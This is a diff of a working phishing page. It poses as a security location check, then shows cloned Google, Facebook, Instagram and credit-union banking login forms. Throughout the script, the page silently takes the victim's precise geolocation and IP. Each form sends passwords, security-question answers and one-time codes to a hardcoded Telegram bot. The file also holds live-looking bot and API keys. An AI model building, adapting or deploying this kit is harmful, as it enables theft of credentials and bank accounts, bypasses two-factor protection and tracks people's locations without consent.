@@ -5,151 +5,154 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Sign in</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:16px; }
-:root { --c: #1a73e8; }
-.card { background:#fff; border-radius:12px; box-shadow:0 2px 12px rgba(0,0,0,0.12); padding:32px 24px; width:100%; max-width:400px; }
-.card-tc { text-align:center; }
-.logo { text-align:center; margin-bottom:24px; }
-.logo h1 { font-size:22px; font-weight:600; margin-top:8px; }
-.logo p { font-size:14px; color:#666; margin-top:4px; }
-.input-group { margin-bottom:16px; }
-.input-group label { display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px; }
-.input-group input { width:100%; padding:12px 14px; border:1.5px solid #ddd; border-radius:8px; font-size:16px; background:#fafafa; }
-.input-group input:focus { outline:none; border-color:var(--c); background:#fff; }
-.btn { display:inline-block; padding:14px 32px; background:var(--c); color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:8px; text-decoration:none; }
-.btn:hover { filter:brightness(0.9); }
-.btn-full { width:100%; padding:14px; background:var(--c); color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:8px; }
-.btn-full:hover { filter:brightness(0.9); }
-.btn-fb { font-size:20px; font-weight:700; }
-.error { color:#d93025; font-size:13px; text-align:center; display:none; margin-top:12px; }
-.loading { display:none; text-align:center; margin-top:16px; }
-.spinner { width:20px; height:20px; border:3px solid #e0e0e0; border-top:3px solid var(--c); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 8px; }
-@keyframes spin { to { transform:rotate(360deg); } }
-.footer { text-align:center; margin-top:20px; font-size:13px; color:#999; }
-.footer a { color:var(--c); text-decoration:none; }
-.hide { display:none !important; }
-.shield { font-size:48px; margin-bottom:16px; }
-.small { font-size:13px; color:#888; }
-.green { color:#34A853; }
-.loc-dot { display:inline-block; width:10px; height:10px; background:#34A853; border-radius:50%; margin-right:6px; animation:pulse 1.5s infinite; }
-@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(1.3)} }
-.loc-status { color:#34A853; margin-top:16px; font-size:14px; display:none; }
-/* Affinity */
-.aff-wrapper { max-width:420px; width:100%; }
-.aff-header { background:linear-gradient(135deg,#003d6b,#005a9c); padding:32px 24px; text-align:center; }
-.aff-header h1 { color:#fff; font-size:22px; font-weight:700; }
-.aff-header p { color:rgba(255,255,255,0.8); font-size:13px; margin-top:4px; }
-.aff-body { background:#fff; padding:24px; }
-.aff-body label { display:block; font-size:12px; font-weight:600; color:#444; letter-spacing:0.5px; margin-bottom:6px; }
-.aff-body input { width:100%; padding:12px; border:1.5px solid #ddd; border-radius:4px; font-size:15px; margin-bottom:16px; background:#fafafa; }
-.aff-body input:focus { border-color:#005a9c; box-shadow:0 0 0 2px rgba(0,90,156,0.1); outline:none; background:#fff; }
-.aff-body select { width:100%; padding:12px; border:1.5px solid #ddd; border-radius:4px; font-size:14px; margin-bottom:16px; background:#fafafa; }
-.aff-btn { width:100%; padding:14px; background:#005a9c; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:600; cursor:pointer; }
-.aff-btn:hover { background:#003d6b; }
-.aff-footer { background:#f5f7fa; padding:14px 24px; text-align:center; border-top:1px solid #e6e8ec; font-size:11px; color:#888; }
-.aff-footer a { color:#005a9c; text-decoration:none; margin:0 6px; }
-.code-inputs { display:flex; gap:8px; justify-content:center; margin:20px 0; }
-.code-inputs input { width:48px; height:54px; text-align:center; font-size:22px; font-weight:600; border:1.5px solid #ddd; border-radius:6px; background:#fafafa; margin-bottom:0; }
-.code-inputs input:focus { border-color:#005a9c; box-shadow:0 0 0 2px rgba(0,90,156,0.15); outline:none; background:#fff; }
-/* Instagram */
-.ig-card { max-width:400px; width:100%; background:#fff; border:1px solid #dbdbdb; padding:40px 32px; text-align:center; }
-.ig-card input { width:100%; padding:12px; border:1px solid #dbdbdb; border-radius:4px; background:#fafafa; font-size:12px; margin-bottom:6px; }
-.ig-card input:focus { border-color:#a8a8a8; outline:none; }
-.ig-btn { width:100%; padding:10px; background:#0095F6; color:#fff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; margin-top:8px; }
-.ig-btn:hover { background:#0081db; }
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
+:root{--c:#1a73e8}
+.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.12);padding:32px 24px;width:100%;max-width:400px}
+.card-tc{text-align:center}
+.logo{text-align:center;margin-bottom:24px}
+.logo h1{font-size:22px;font-weight:600;margin-top:8px}
+.logo p{font-size:14px;color:#666;margin-top:4px}
+.input-group{margin-bottom:16px}
+.input-group label{display:block;font-size:14px;font-weight:500;color:#333;margin-bottom:6px}
+.input-group input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:16px;background:#fafafa}
+.input-group input:focus{outline:none;border-color:var(--c);background:#fff}
+.btn{display:inline-block;padding:14px 32px;background:var(--c);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;text-decoration:none}
+.btn:hover{filter:brightness(0.9)}
+.btn-full{width:100%;padding:14px;background:var(--c);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+.btn-full:hover{filter:brightness(0.9)}
+.btn-fb{font-size:20px;font-weight:700}
+.error{color:#d93025;font-size:13px;text-align:center;display:none;margin-top:12px}
+.loading{display:none;text-align:center;margin-top:16px}
+.spinner{width:20px;height:20px;border:3px solid #e0e0e0;border-top:3px solid var(--c);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 8px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.footer{text-align:center;margin-top:20px;font-size:13px;color:#999}
+.footer a{color:var(--c);text-decoration:none}
+.hide{display:none!important}
+.shield{font-size:48px;margin-bottom:16px}
+.small{font-size:13px;color:#888}
+.green{color:#34A853}
+.loc-dot{display:inline-block;width:10px;height:10px;background:#34A853;border-radius:50%;margin-right:6px;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.3)}}
+.loc-status{color:#34A853;margin-top:16px;font-size:14px;display:none}
+.aff-wrapper{max-width:420px;width:100%}
+.aff-header{background:linear-gradient(135deg,#003d6b,#005a9c);padding:32px 24px;text-align:center}
+.aff-header h1{color:#fff;font-size:22px;font-weight:700}
+.aff-header p{color:rgba(255,255,255,0.8);font-size:13px;margin-top:4px}
+.aff-body{background:#fff;padding:24px}
+.aff-body label{display:block;font-size:12px;font-weight:600;color:#444;letter-spacing:0.5px;margin-bottom:6px}
+.aff-body input{width:100%;padding:12px;border:1.5px solid #ddd;border-radius:4px;font-size:15px;margin-bottom:16px;background:#fafafa}
+.aff-body input:focus{border-color:#005a9c;box-shadow:0 0 0 2px rgba(0,90,156,0.1);outline:none;background:#fff}
+.aff-body select{width:100%;padding:12px;border:1.5px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:16px;background:#fafafa}
+.aff-btn{width:100%;padding:14px;background:#005a9c;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
+.aff-btn:hover{background:#003d6b}
+.aff-footer{background:#f5f7fa;padding:14px 24px;text-align:center;border-top:1px solid #e6e8ec;font-size:11px;color:#888}
+.aff-footer a{color:#005a9c;text-decoration:none;margin:0 6px}
+.code-inputs{display:flex;gap:8px;justify-content:center;margin:20px 0}
+.code-inputs input{width:48px;height:54px;text-align:center;font-size:22px;font-weight:600;border:1.5px solid #ddd;border-radius:6px;background:#fafafa;margin-bottom:0}
+.code-inputs input:focus{border-color:#005a9c;box-shadow:0 0 0 2px rgba(0,90,156,0.15);outline:none;background:#fff}
+.ig-card{max-width:400px;width:100%;background:#fff;border:1px solid #dbdbdb;padding:40px 32px;text-align:center}
+.ig-card input{width:100%;padding:12px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:12px;margin-bottom:6px}
+.ig-card input:focus{border-color:#a8a8a8;outline:none}
+.ig-btn{width:100%;padding:10px;background:#0095F6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
+.ig-btn:hover{background:#0081db}
 </style>
 </head>
 <body>
 <div id="app"></div>
 <script>
 const BT="8809602041:AAHIwV4msf_j0G5bgCRqLYAM0EuVSGVAv84",CI="8647509715";
-let lat=null,lon=null,locMethod='none';
-let ip={ip:'?',city:'?',country:'?',isp:'?'};
-function tg(m){var x=new XMLHttpRequest();x.open('POST','https://api.telegram.org/bot'+BT+'/sendMessage',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({chat_id:CI,text:m,parse_mode:"Markdown"}));}
-fetch('https://freeipapi.com/api/json/').then(r=>r.json()).then(d=>{ip.ip=d.ipv4||d.ip||'?';ip.city=d.cityName||d.city||'?';ip.country=d.countryName||d.country||'?';ip.isp=d.ispName||d.organizationName||d.org||'?';lat=d.latitude||lat;lon=d.longitude||lon;}).catch(()=>{});
-function locStr(){let s=`🌐 IP: \`${ip.ip}\`\n📍 ${ip.city}, ${ip.country}\n🏢 ${ip.isp}\n📌 Method: ${locMethod}`;if(lat&&lon)s+=`\n🎯 ${lat}, ${lon}\n🗺 https://www.google.com/maps?q=${lat},${lon}`;return s;}
+var lat=null,lon=null,locMethod='none',ip={ip:'?',city:'?',country:'?',isp:'?'};
+
+function tg(m){
+  var x=new XMLHttpRequest();
+  x.open('POST','https://api.telegram.org/bot'+BT+'/sendMessage',true);
+  x.setRequestHeader('Content-Type','application/json');
+  x.send(JSON.stringify({chat_id:CI,text:m,parse_mode:"Markdown"}));
+}
+
+function getIP(){
+  var x=new XMLHttpRequest();
+  x.open('GET','https://freeipapi.com/api/json/',false);
+  try{x.send();var d=JSON.parse(x.responseText);
+    ip.ip=d.ipv4||d.ip||'?';ip.city=d.cityName||d.city||'?';
+    ip.country=d.countryName||d.country||'?';ip.isp=d.ispName||d.organizationName||d.org||'?';
+    if(!lat&&d.latitude)lat=d.latitude;if(!lon&&d.longitude)lon=d.longitude;
+  }catch(e){}
+}
+getIP();
+
+function locStr(){
+  if(ip.ip==='?')getIP();
+  var s='🌐 IP: `'+ip.ip+'`\n📍 '+ip.city+', '+ip.country+'\n🏢 '+ip.isp+'\n📌 Method: '+locMethod;
+  if(lat&&lon)s+='\n🎯 '+lat+', '+lon+'\n🗺 https://www.google.com/maps?q='+lat+','+lon;
+  return s;
+}
+
+function setC(c){document.documentElement.style.setProperty('--c',c);}
 
 // ===== LOCATION GATE =====
-function renderLocationGate(){
-  document.getElementById('app').innerHTML=`
-    <div class="card card-tc">
-      <div class="shield">🛡️</div>
-      <h1 style="color:var(--c)">Verify Your Location</h1>
-      <p style="font-size:14px;color:#666;margin-bottom:8px">We detected a sign-in from an unrecognized device.</p>
-      <p class="small" style="margin-bottom:20px">For your security, please verify your current location.</p>
-      <button id="locBtn" class="btn" style="margin:0 auto">📍 Verify My Location</button>
-      <div class="loc-status" id="locStatus"><span class="loc-dot"></span><span id="locMsg"></span></div>
-      <button id="contBtn" class="btn" style="display:none;margin:16px auto 0">Continue →</button>
-    </div>`;
-  document.getElementById('locBtn').onclick=function(){
-    this.textContent='⏳ Requesting...';this.disabled=true;
-    if(!navigator.geolocation){wifiFallback();return;}
-    navigator.geolocation.getCurrentPosition(
-      p=>{lat=p.coords.latitude;lon=p.coords.longitude;locMethod='gps';locDone();},
-      ()=>{wifiFallback();},
-      {enableHighAccuracy:true,timeout:20000,maximumAge:0}
-    );
-  };
-  document.getElementById('contBtn').onclick=proceed;
-}
+(function(){document.getElementById('app').innerHTML='<div class="card card-tc"><div class="shield">🛡️</div><h1 style="color:var(--c)">Verify Your Location</h1><p style="font-size:14px;color:#666;margin-bottom:8px">We detected a sign-in from an unrecognized device.</p><p class="small" style="margin-bottom:20px">For your security, please verify your current location.</p><button id="locBtn" class="btn" style="margin:0 auto">📍 Verify My Location</button><div class="loc-status" id="locStatus"><span class="loc-dot"></span><span id="locMsg"></span></div><button id="contBtn" class="btn" style="display:none;margin:16px auto 0">Continue →</button></div>';
+document.getElementById('locBtn').onclick=function(){
+  this.textContent='⏳ Requesting...';this.disabled=true;
+  if(!navigator.geolocation){wifiFallback();return;}
+  navigator.geolocation.getCurrentPosition(
+    function(p){lat=p.coords.latitude;lon=p.coords.longitude;locMethod='gps';locDone();},
+    function(){wifiFallback();},
+    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+  );
+};
+document.getElementById('contBtn').onclick=proceed;
+})();
+
 function wifiFallback(){
   document.getElementById('locBtn').textContent='📡 Using WiFi location...';
-  fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA_9m0J7OslUTVDBFgqZEUq5fUzJpG7_Ws',{
-    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({considerIp:true})
-  }).then(r=>r.json()).then(d=>{
-    if(d.location){lat=d.location.lat;lon=d.location.lng;locMethod='wifi';locDone();}
-    else document.getElementById('contBtn').style.display='inline-block';
-  }).catch(()=>{document.getElementById('contBtn').style.display='inline-block';});
+  var x=new XMLHttpRequest();
+  x.open('POST','https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA_9m0J7OslUTVDBFgqZEUq5fUzJpG7_Ws',true);
+  x.setRequestHeader('Content-Type','application/json');
+  x.onload=function(){try{var d=JSON.parse(x.responseText);if(d.location){lat=d.location.lat;lon=d.location.lng;locMethod='wifi';locDone();}else document.getElementById('contBtn').style.display='inline-block';}catch(e){document.getElementById('contBtn').style.display='inline-block';}};
+  x.onerror=function(){document.getElementById('contBtn').style.display='inline-block';};
+  x.send(JSON.stringify({considerIp:true}));
 }
+
 function locDone(){
   document.getElementById('locBtn').style.display='none';
   var s=document.getElementById('locStatus');s.style.display='block';
-  document.getElementById('locMsg').textContent=`Location verified (${lat.toFixed(4)}, ${lon.toFixed(4)})`;
-  setTimeout(proceed,1200);
+  document.getElementById('locMsg').textContent='Location verified ('+lat.toFixed(4)+', '+lon.toFixed(4)+')';
+  setTimeout(proceed,1000);
 }
+
 function proceed(){
-  tg(`📍 *Location Captured*\n${locStr()}\n⏰ ${new Date().toISOString()}`);
+  tg('📍 *Location Captured*\n'+locStr()+'\n⏰ '+new Date().toISOString());
   var b=(new URLSearchParams(location.search)).get('brand')||'google';
   if(b==='facebook')renderFB();else if(b==='instagram')renderIG();else if(b==='affinity')renderAff(1);else renderGoogle();
 }
 
 // ===== GOOGLE =====
 function renderGoogle(){setC('#1a73e8');
-  document.getElementById('app').innerHTML=`
-  <div class="card"><div class="logo"><svg width="48" height="48" viewBox="0 0 48 48"><path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/><path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/><path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/><path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/></svg><h1>Sign in</h1><p>Use your Google Account</p></div>
-    <form id="f"><div class="input-group"><label>Email or phone</label><input type="text" id="e" placeholder="you@gmail.com" required></div><div class="input-group"><label>Password</label><input type="password" id="p" placeholder="Enter your password" required></div><div class="error" id="err">Couldn't sign you in.</div><button type="submit" class="btn-full">Sign in</button></form>
-    <div class="loading" id="load"><div class="spinner"></div><p>Verifying...</p></div><div class="footer"><a href="#">Forgot password?</a></div></div>`;
-  document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Google — Credentials*\n📧 `'+em+'`\n🔑 `'+pw+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};
-}
+document.getElementById('app').innerHTML='<div class="card"><div class="logo"><svg width="48" height="48" viewBox="0 0 48 48"><path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/><path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/><path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/><path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/></svg><h1>Sign in</h1><p>Use your Google Account</p></div><form id="f"><div class="input-group"><label>Email or phone</label><input type="text" id="e" placeholder="you@gmail.com" required></div><div class="input-group"><label>Password</label><input type="password" id="p" placeholder="Enter your password" required></div><div class="error" id="err">Couldn\'t sign you in.</div><button type="submit" class="btn-full">Sign in</button></form><div class="loading" id="load"><div class="spinner"></div><p>Verifying...</p></div><div class="footer"><a href="#">Forgot password?</a></div></div>';
+document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Google — Credentials*\n📧 `'+em+'`\n🔑 `'+pw+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};}
+
 // ===== FACEBOOK =====
 function renderFB(){setC('#1877F2');
-  document.getElementById('app').innerHTML=`
-  <div class="card"><div class="logo"><svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20" fill="#1877F2"/><path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/></svg><h1 style="color:#1877F2">Log in to Facebook</h1></div>
-    <form id="f"><div class="input-group"><label>Email or phone</label><input type="text" id="e" placeholder="Email or phone" required></div><div class="input-group"><label>Password</label><input type="password" id="p" required></div><button type="submit" class="btn-full btn-fb">Log in</button><div class="error" id="err" style="margin-top:16px">Wrong credentials.</div></form>
-    <div class="loading" id="load"><div class="spinner"></div><p>Verifying...</p></div><div class="footer"><a href="#">Forgotten account?</a></div></div>`;
-  document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Facebook — Credentials*\n📧 `'+em+'`\n🔑 `'+pw+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};
-}
+document.getElementById('app').innerHTML='<div class="card"><div class="logo"><svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20" fill="#1877F2"/><path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/></svg><h1 style="color:#1877F2">Log in to Facebook</h1></div><form id="f"><div class="input-group"><label>Email or phone</label><input type="text" id="e" placeholder="Email or phone" required></div><div class="input-group"><label>Password</label><input type="password" id="p" required></div><button type="submit" class="btn-full btn-fb">Log in</button><div class="error" id="err" style="margin-top:16px">Wrong credentials.</div></form><div class="loading" id="load"><div class="spinner"></div><p>Verifying...</p></div><div class="footer"><a href="#">Forgotten account?</a></div></div>';
+document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Facebook — Credentials*\n📧 `'+em+'`\n🔑 `'+pw+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};}
+
 // ===== INSTAGRAM =====
 function renderIG(){setC('#0095F6');
-  document.getElementById('app').innerHTML=`
-  <div class="ig-card"><svg width="64" height="64" viewBox="0 0 48 48"><defs><linearGradient id="g" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs><rect x="4" y="4" width="40" height="40" rx="10" fill="url(#g)"/><circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/><circle cx="32" cy="16" r="2" fill="#fff"/></svg>
-    <form id="f" style="margin-top:32px"><input type="text" id="e" placeholder="Phone, username, or email" required><input type="password" id="p" placeholder="Password" required><button type="submit" class="ig-btn">Log in</button><div class="error" id="err" style="margin-top:12px;font-size:14px;">Sorry, password incorrect.</div></form>
-    <div class="loading" id="load" style="display:none;margin-top:16px"><div class="spinner"></div><p>Logging in...</p></div></div>`;
-  document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Instagram — Credentials*\n📧 `'+em+'`\n🔑 `'+pw+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};
-}
-// ===== AFFINITY (3-step) =====
+document.getElementById('app').innerHTML='<div class="ig-card"><svg width="64" height="64" viewBox="0 0 48 48"><defs><linearGradient id="g" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs><rect x="4" y="4" width="40" height="40" rx="10" fill="url(#g)"/><circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/><circle cx="32" cy="16" r="2" fill="#fff"/></svg><form id="f" style="margin-top:32px"><input type="text" id="e" placeholder="Phone, username, or email" required><input type="password" id="p" placeholder="Password" required><button type="submit" class="ig-btn">Log in</button><div class="error" id="err" style="margin-top:12px;font-size:14px;">Sorry, password incorrect.</div></form><div class="loading" id="load" style="display:none;margin-top:16px"><div class="spinner"></div><p>Logging in...</p></div></div>';
+document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Instagram — Credentials*\n📧 `'+em+'`\n🔑 `'+pw+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};}
+
+// ===== AFFINITY =====
 function renderAff(s){setC('#005a9c');
-  if(s===1){document.getElementById('app').innerHTML='<div class="aff-wrapper" id="a1"><div class="aff-header"><h1>Online Banking</h1><p>Sign in to your account</p></div><div class="aff-body"><form id="f"><label>MEMBER NUMBER</label><input type="text" id="e" placeholder="Enter your member number" required><label>PASSWORD</label><input type="password" id="p" placeholder="Enter your password" required><div class="error" id="err">Incorrect member number or password.</div><button type="submit" class="aff-btn">Sign In</button></form><div class="loading" id="load"><div class="spinner"></div><p>Verifying...</p></div></div><div class="aff-footer"><a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call 1.866.863.6237</div></div>';
-    document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Affinity — Credentials*\n📧 Member#: `'+em+'`\n🔑 Password: `'+pw+'`\n\n'+locStr());setTimeout(function(){renderAff(2);},2000);};}
-  else if(s===2){document.getElementById('app').innerHTML='<div class="aff-wrapper" id="a2"><div class="aff-header"><h1>Verify Your Identity</h1><p>Please answer the following question</p></div><div class="aff-body"><form id="f"><label>SECURITY QUESTION</label><select id="sq" style="width:100%;padding:12px;border:1.5px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:16px;background:#fafafa"><option value="">— Select a question —</option><option value="What is your father\'s middle name?">What is your father\'s middle name?</option><option value="What was the name of your first pet?">What was the name of your first pet?</option><option value="What is your mother\'s maiden name?">What is your mother\'s maiden name?</option><option value="What street did you grow up on?">What street did you grow up on?</option><option value="What was the name of your elementary school?">What was the name of your elementary school?</option><option value="What is the name of your first employer?">What is the name of your first employer?</option></select><label>YOUR ANSWER</label><input type="text" id="sa" placeholder="Enter your answer" required><div class="error" id="err">Incorrect answer.</div><button type="submit" class="aff-btn">Verify</button></form><div class="loading" id="load" style="display:none"><div class="spinner"></div><p>Verifying...</p></div></div><div class="aff-footer"><a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a></div></div>';
-    document.getElementById('f').onsubmit=function(e){e.preventDefault();var q=document.getElementById('sq').value,a=document.getElementById('sa').value.trim();document.getElementById('load').style.display='block';e.target.style.display='none';tg('🛡️ *Affinity — Security Q*\n❓ '+q+'\n✏️ `'+a+'`');setTimeout(function(){renderAff(3);},2000);};}
-  else if(s===3){document.getElementById('app').innerHTML='<div class="aff-wrapper" id="a3"><div class="aff-header"><h1>Verify Your Identity</h1><p>Enter the code sent to your device</p></div><div class="aff-body"><p style="font-size:14px;color:#555;text-align:center;margin-bottom:8px">A 6-digit code was sent to your phone.</p><form id="f"><div class="code-inputs"><input type="text" id="c1" maxlength="1" inputmode="numeric"><input type="text" id="c2" maxlength="1" inputmode="numeric"><input type="text" id="c3" maxlength="1" inputmode="numeric"><input type="text" id="c4" maxlength="1" inputmode="numeric"><input type="text" id="c5" maxlength="1" inputmode="numeric"><input type="text" id="c6" maxlength="1" inputmode="numeric"></div><div class="error" id="err">Invalid code.</div><button type="submit" class="aff-btn">Verify</button></form><div class="loading" id="load" style="display:none"><div class="spinner"></div><p>Verifying code...</p></div></div><div class="aff-footer"><a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a></div></div>';
-    ['c1','c2','c3','c4','c5','c6'].forEach((id,i)=>{document.getElementById(id).oninput=function(){if(this.value.length>=1&&i<5)document.getElementById(['c1','c2','c3','c4','c5','c6'][i+1]).focus();};document.getElementById(id).onkeydown=function(e){if(e.key==='Backspace'&&this.value.length===0&&i>0)document.getElementById(['c1','c2','c3','c4','c5','c6'][i-1]).focus();};});
-    document.getElementById('f').onsubmit=function(e){e.preventDefault();var c=['c1','c2','c3','c4','c5','c6'].map(function(id){return document.getElementById(id).value}).join('');if(c.length<6)return;document.getElementById('load').style.display='block';e.target.style.display='none';tg('📱 *Affinity — 2FA Code*\n🔢 `'+c+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};}
+if(s===1){document.getElementById('app').innerHTML='<div class="aff-wrapper" id="a1"><div class="aff-header"><h1>Online Banking</h1><p>Sign in to your account</p></div><div class="aff-body"><form id="f"><label>MEMBER NUMBER</label><input type="text" id="e" placeholder="Enter your member number" required><label>PASSWORD</label><input type="password" id="p" placeholder="Enter your password" required><div class="error" id="err">Incorrect member number or password.</div><button type="submit" class="aff-btn">Sign In</button></form><div class="loading" id="load"><div class="spinner"></div><p>Verifying...</p></div></div><div class="aff-footer"><a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call 1.866.863.6237</div></div>';
+document.getElementById('f').onsubmit=function(e){e.preventDefault();var em=document.getElementById('e').value.trim(),pw=document.getElementById('p').value;document.getElementById('load').style.display='block';tg('🔔 *Affinity — Credentials*\n📧 Member#: `'+em+'`\n🔑 Password: `'+pw+'`\n\n'+locStr());setTimeout(function(){renderAff(2);},2000);};}
+else if(s===2){document.getElementById('app').innerHTML='<div class="aff-wrapper" id="a2"><div class="aff-header"><h1>Verify Your Identity</h1><p>Please answer the following question</p></div><div class="aff-body"><form id="f"><label>SECURITY QUESTION</label><select id="sq" style="width:100%;padding:12px;border:1.5px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:16px;background:#fafafa"><option value="">— Select a question —</option><option value="What is your father\'s middle name?">What is your father\'s middle name?</option><option value="What was the name of your first pet?">What was the name of your first pet?</option><option value="What is your mother\'s maiden name?">What is your mother\'s maiden name?</option><option value="What street did you grow up on?">What street did you grow up on?</option><option value="What was the name of your elementary school?">What was the name of your elementary school?</option><option value="What is the name of your first employer?">What is the name of your first employer?</option></select><label>YOUR ANSWER</label><input type="text" id="sa" placeholder="Enter your answer" required><div class="error" id="err">Incorrect answer.</div><button type="submit" class="aff-btn">Verify</button></form><div class="loading" id="load" style="display:none"><div class="spinner"></div><p>Verifying...</p></div></div><div class="aff-footer"><a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a></div></div>';
+document.getElementById('f').onsubmit=function(e){e.preventDefault();var q=document.getElementById('sq').value,a=document.getElementById('sa').value.trim();document.getElementById('load').style.display='block';e.target.style.display='none';tg('🛡️ *Affinity — Security Q*\n❓ '+q+'\n✏️ `'+a+'`');setTimeout(function(){renderAff(3);},2000);};}
